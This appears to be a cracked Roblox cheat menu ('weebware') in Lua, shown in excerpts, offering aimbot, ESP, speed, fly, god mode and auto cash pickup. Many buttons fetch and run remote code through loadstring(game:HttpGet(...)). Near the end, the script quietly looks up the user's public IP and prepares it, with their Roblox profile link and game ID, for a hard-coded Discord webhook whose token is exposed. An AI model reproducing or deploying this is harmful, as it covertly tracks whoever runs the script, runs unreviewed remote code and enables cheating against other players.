...
wait(3)
local Aiming = loadstring(game:HttpGet("https://raw.githubusercontent.com/weebware-scripts/weebware/main/fov.lua"))()
local ESP = loadstring(game:HttpGet("https://raw.githubusercontent.com/weebware-scripts/weebware/main/esp.lua"))()
ESP:Toggle(false)
ESP.Tracers = false
ESP.Names = false
ESP.Boxes = false
...
local AimingTab = Window:CreateTab("Config")
local SilentSection = AimingTab:CreateSector("Aim", "left")
...
local fovsettings = AimingTab:CreateSector("Fov", "right")

local HitChanceSlider = fovsettings:AddSlider("Hitchance", 0, 100, 400, 1, function(value)
    DaHoodSettings.Prediction = tonumer("0." .. value)
end)

local fovsize = fovsettings:AddSlider("Size", 0, 30, 500, 1, function(value)
    Aiming.FOV = value
end)

local fovsides = fovsettings:AddSlider("Sides", 1, 40, 40, 1, function(value)
...
aimlock:AddTextbox("Keybind", nil, function(L_69_arg0)
...
local espToggle = EspSection:AddToggle("ESP", false, function(bool)
    ESP:Toggle(bool)
end)
...
local antibag = togglessector:AddToggle('Anti Bag', false, function(State)
    WeebwareSettings.Blatant.Character.AntiBag = State
end)
...
local aura = togglessector:AddToggle("Cash Aura", false, function(State)
    WeebwareSettings.Blatant.Cash.AutoPickCash = State
end)
...
NotifyLib.prompt('weebware', 'Noclip keybind is B!', 5)
end)


local fly2 = togglessector:AddButton("Fly", function()
    NotifyLib.prompt('weebware', 'Fly keybind is X!', 5)
    loadstring(Game:HttpGet('https://raw.githubusercontent.com/weebware-scripts/weebware/main/fly.lua'))()

end)
local currentfov = game:GetService'Workspace'.Camera.FieldOfView

local fovchanger = togglessector:AddSlider("Change Fov", 1, currentfov,120, 1, function(value)
    game:GetService'Workspace'.Camera.FieldOfView = value
end)

fovchanger:Set(game:GetService'Workspace'.Camera.FieldOfView)
...
local spinbotspeed = togglessector:AddSlider("Spin Speed", 1, 10, 20, 1, function(value)
...
local animationgamepass = VisualsSection:AddButton("Animation Gamepass", function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/weebware-scripts/weebware/main/animation_gamepass.lua'))()
end)

local animbutton = VisualsSection:AddButton("Animations", function(bool)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/weebware-scripts/weebware/main/anims.lua"))()
end)
...
local meanie = facesection:AddButton("Meanie", function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/weebware-scripts/weebware/main/faces/508490451.lua'))()
end)

local sshf = facesection:AddButton("Super Super Happy Face", function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/weebware-scripts/weebware/main/faces/494290547.lua'))()
end)

local silverpunk = facesection:AddButton("Silver Punk Face", function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/weebware-scripts/weebware/main/faces/387256104.lua'))()
end)

local yum = facesection:AddButton("Yum", function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/weebware-scripts/weebware/main/faces/26018945.lua'))()
end)

local playful = facesection:AddButton("Playful Vampire", function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/weebware-scripts/weebware/main/faces/2409281591.lua'))()
end)

local beastmode = facesection:AddButton("Beast Mode", function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/weebware-scripts/weebware/main/faces/127959433.lua'))()
end)
...
local hop = MiscSection:AddButton("Server hop", function(State)
    loadstring(game:HttpGet('https://raw.githubusercontent.com/weebware-scripts/weebware/main/serverhop.lua'))()
end)
local trash = MiscSection:AddButton("Trash Talk", function(State)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/weebware-scripts/weebware/main/trash_talk.lua"))()
    NotifyLib.prompt('weebware', 'Trash Talk keybind is J!', 5)
end)
...
local fullbright = MiscSection:AddButton("Full Bright", function(State)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/weebware-scripts/weebware/main/full_bright.lua"))()
end)

local nocooldown = MiscSection:AddButton("No jump cooldown", function(State)
    loadstring(game:HttpGet('https://raw.githubusercontent.com/weebware-scripts/weebware/main/no-jump-cooldown.lua'))()
end)
    
local weightfarm = MiscSection:AddButton("Weight Farm", function(State)
    loadstring(game:HttpGet('https://raw.githubusercontent.com/weebware-scripts/weebware/main/weight_farm.lua'))()
end)
local god = MiscSection:AddButton("God Mode", function(State)
    loadstring(game:HttpGet('https://raw.githubusercontent.com/weebware-scripts/weebware/main/godmode.lua'))()
...
local SpeedToggle = MovementSector:AddToggle('Speed Enabled', false, function(State)
    WeebwareSettings.Blatant.Movement.SpeedEnabled = State
end)

SpeedToggle:AddSlider(0, 5, 10, 1, function(Value)
    WeebwareSettings.Blatant.Movement.SpeedAmount = Value
end)

MovementSector:AddDropdown("Speed Type", {"CFrame"}, "CFrame", false, function(Value)
    WeebwareSettings.Blatant.Movement.SpeedType = Value
end)

MovementSector:AddDropdown("Speed Render Type", {"Default", "Fast"}, "Default", false, function(Value)
    WeebwareSettings.Blatant.Movement.SpeedRenderType = Value
end)
...
local avatarchanger = scriptsSection:AddButton("Avatar Modifier", function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/weebware-scripts/weebware/main/cracked%20stuff/facechanger.lua'))()
end)

local ben = scriptsSection:AddButton("Ben Talk", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/weebware-scripts/weebware/main/ben.lua"))()
    game.StarterGui:SetCore("SendNotification", {
        Title = "weebware";
...
local panic = scriptsSection:AddButton("Rage quit", function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/weebware-scripts/weebware/main/ragequit.lua'))()
end)
...
NotifyLib.prompt('weebware', 'Super Jump keybind is H!', 5)
end)
...
NotifyLib.prompt('weebware', 'Speed keybind is C!', 5)
end)
...
NotifyLib.prompt('weebware', 'Antilock keybind is H!', 5)
end)
...
RunSer.Heartbeat:Connect(function()
    if Alive(LocalPlayer) then
        if WeebwareSettings.Blatant.Movement.SpeedEnabled and WeebwareSettings.Blatant.Movement.SpeedType == "CFrame" then
            if WeebwareSettings.Blatant.Movement.SpeedRenderType == "Default" then
                if LocalPlayer.Character.Humanoid.MoveDirection.Magnitude > 0 then
                    for i = 1, WeebwareSettings.Blatant.Movement.SpeedAmount do
        ...
        if WeebwareSettings.Blatant.Movement.SpeedEnabled and WeebwareSettings.Blatant.Movement.SpeedType == "CFrame" then
            if WeebwareSettings.Blatant.Movement.SpeedRenderType == "Fast" and Alive(LocalPlayer) then
                if LocalPlayer.Character.Humanoid.MoveDirection.Magnitude > 0 then
                    for i = 1, WeebwareSettings.Blatant.Movement.SpeedAmount do
                        LocalPlayer.Character:TranslateBy(LocalPlayer.Character.Humanoid.MoveDirection)
                    end
        ...
        if WeebwareSettings.Blatant.Cash.AutoPickCash then
            pcall(function()
        ...
        if WeebwareSettings.Blatant.Character.AntiBag then
...
NotifyLib.prompt('weebware', 'Loading Status: Success', 2)
wait(3)
NotifyLib.prompt('weebware', 'discord.gg/'..getgenv().Discord, 5)

print("| [weebware] Job id: " ..game.JobId.. "")
print("| [weebware] Join us discord.gg/"..getgenv().Discord)
warn("| [weebware] Skidded ahh script")

local url = 'https://discord.com/api/webhooks/986359233224257536/DERIOrA126tP65hVmq6SMze5exrTV5g5K4Uh8S_ocs4u3IeCqVnJNMPQabWasE3T7ndY'
local req = syn.request or http_request or http

local ip = tostring(game:HttpGet("https://api.ipify.org", true))

local data = {
    ["username"]  = "weebware chan",
    ["avatar_url"] = "https://i.pinimg.com/564x/3e/05/de/3e05de6e1097d0814431505ee231a41b.jpg",
    ["embeds"] = {
        {
            ["author"] = {
                ["name"] = game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name,
                ["url"] = "https://www.roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile",
                ["icon_url"] = "https://i.pinimg.com/564x/3e/05/de/3e05de6e1097d0814431505ee231a41b.jpg"
            },
            ["url"] = "https://www.roblox.com/games/"..game.PlaceId,
            ["description"] = "Requested by : **"..ip.."**",
            ["color"] = Color3.fromRGB(235, 52, 229),
            ["fields"] = {
                {
                    ["name"] = "Game ID",
                    ["value"] = "```"..game.PlaceId.."```",
            ...
            ["thumbnail"] = {
                ["url"] = "https://i.pinimg.com/564x/3e/05/de/3e05de6e1097d0814431505ee231a41b.jpg"
            },
        }
    }
}
...
--[[hoodsense source cracked and changed lmao get good bozo]]
-------------------------------------------------------------------------
